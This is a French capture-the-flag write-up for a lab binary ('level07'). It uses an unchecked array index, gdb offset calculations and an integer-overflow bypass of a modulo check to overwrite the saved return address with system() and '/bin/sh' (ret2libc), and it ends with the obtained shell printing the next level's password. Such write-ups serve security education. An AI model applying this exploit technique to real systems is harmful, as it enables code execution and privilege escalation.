Ce programme stock un nombre à un index spécifié manuellement, il est ensuite possible de les relire en spécifiant un index.

Le nombre est stocké dans un tableau d'int de taille 100, mais aucune vérifiaction n'est faite si l'index spécifié est au dela de 100, que se soit en lecture ou en ecriture.

Certains index sont inaccessible, notemment les (index % 3 == 0)
"if ((uVar2 % 3 == 0 || ...))"

Puisque l'index n'est pas protégé on peut librement lire dans la stack. Il faut donc trouver l'adresse de l'EIP et utiliser la méthode ret2libc.

D'abord on récupère l'adresse du tableau d'int à l'index 0:

(gdb) disas read_number
...
0x080486ff <+40>:    add    0x8(%ebp),%eax // ebp+0x8 = adresse du tableau
...
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07
...
Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x $ebp+0x8
0xffffd520:     0xffffd544

On obtient l'adresse ou est stocké l'adresse du tableau, ainsi que l'adresse du tableau.
On calcule la difference entre les 2 adresses pour obtenir l'index ou se trouve le tableau:

0xffffd520 - 0xffffd544 = -36, que l'on divise par 4 car c'est un tableau d'int = -9

On peut le vérifier facilement en redemarrant le programme:

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07
...
Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) c
Continuing.
 Index: -9
 Number at data[4294967287] is 4294956356

4294956356 = 0xffffd544 donc tout est bon.

On récupère maintenant l'index de l'EIP de la fonction main:

(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebp at 0xffffd708, eip at 0xffffd70c

L'adresse de l'EIP est donc: 0xffffd70c
On récupère son index dans le tableau: 0xffffd70c - 0xffffd544 = 0x1C8 = 456, /4 car tableau d'int = 114.

On vérifie:
(gdb) r
...
Input command: read

Breakpoint 2, 0x0804892b in main ()
(gdb) c
Continuing.

Breakpoint 1, 0x080486dd in read_number ()
(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully

 4158936339 = 0xf7e45513

 On vérifie toujours au même breakpoint avec l'adresse de l'EIP:
(gdb) x/x 0xffffd70c
0xffffd70c:     0xf7e45513

On est bon ! On peut maintenant overwrite l'EIP avec la fonction system:

(gdb) info function system
All functions matching regular expression "system":
...
0xf7e6aed0  system -> 4159090384
...

114 % 3 étant égale à 0 il nous faut bypass la protection, ce qui est possible avec un overflow: (UINT_MAX/4) + 114 = 1073741938, cet overflow nous permettra d'obtenir 114 tout en passant la protection car 1073741938 % 3 = 1

L'overflow est possible grace au *4: *(uint *)(uVar2 * 4 + param_1) = uVar1;

On récupère l'adresse de /bin/sh:
gdb ./level07
(gdb) b *main
(gdb) r
(gdb) find &system,+9999999,"/bin/sh"
-> 0xf7f897ec = 4160264172

On à maintenant tout les éléments pour effectuer un ret2libc:

./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384 // system
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172 // /bin/sh
 Index: 116
 Completed store command successfully
Input command: quit
whoami
level08
cat ~level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC